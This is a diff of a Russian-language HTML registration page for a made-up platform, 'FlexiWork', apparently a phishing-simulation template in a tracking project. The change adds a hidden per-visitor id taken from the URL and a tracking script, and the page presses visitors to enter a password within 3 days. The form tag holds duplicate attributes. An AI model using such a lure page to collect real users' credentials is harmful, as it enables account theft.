@@ -1,38 +1,43 @@
 <!DOCTYPE html>
 <html lang="ru">
+
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FlexiWork  </title>
-  <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_11.1.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FlexiWork </title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style_11.1.css') }}">
+
 
 <body>
-<div class="container">
-  <div class="logo">
-    <h1>FlexiWork</h1>
-    <p>Оптимизируй свою работу с нами</p>
+  <div class="container">
+    <div class="logo">
+      <h1>FlexiWork</h1>
+      <p>Оптимизируй свою работу с нами</p>
+    </div>
+
+    <p><strong>FlexiWork</strong> — новая платформа для повышения эффективности работы команды. Пожалуйста,
+      зарегистрируйтесь, чтобы получить доступ к её функциям.</p>
+    <p><strong>Регистрация доступна в течение 3 дней.</strong></p>
+
+    <form action="https://example.com/register" method="POST" action="/site_11.1" method="get">
+      <input type="hidden" name="id" value="{{ request.args.get('id') }}">
+      <label for="name">Имя</label>
+      <input class="имя" type="text" id="name" name="name" placeholder="Ваше имя" required />
+
+      <label for="email">Электронная почта</label>
+      <input class="почта" type="email" id="email" name="email" placeholder="Ваш email" required />
+
+      <label for="password">Пароль</label>
+      <input class="пароль" type="password" id="password" name="password" placeholder="Введите пароль" required />
+
+      <button type="submit">Зарегистрироваться</button>
+    </form>
+
+    <div class="footer">
+
+    </div>
   </div>
-
-  <p><strong>FlexiWork</strong> — новая платформа для повышения эффективности работы команды. Пожалуйста, зарегистрируйтесь, чтобы получить доступ к её функциям.</p>
-  <p><strong>Регистрация доступна в течение 3 дней.</strong></p>
-
-  <form action="https://example.com/register" method="POST">
-    <label for="name">Имя</label>
-    <input type="text" id="name" name="name" placeholder="Ваше имя" required />
-
-    <label for="email">Электронная почта</label>
-    <input type="email" id="email" name="email" placeholder="Ваш email" required />
-
-    <label for="password">Пароль</label>
-    <input type="password" id="password" name="password" placeholder="Введите пароль" required />
-
-    <button type="submit">Зарегистрироваться</button>
-  </form>
-
-  <div class="footer">
-
-  </div>
-</div>
-
+  <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
+
 </html>
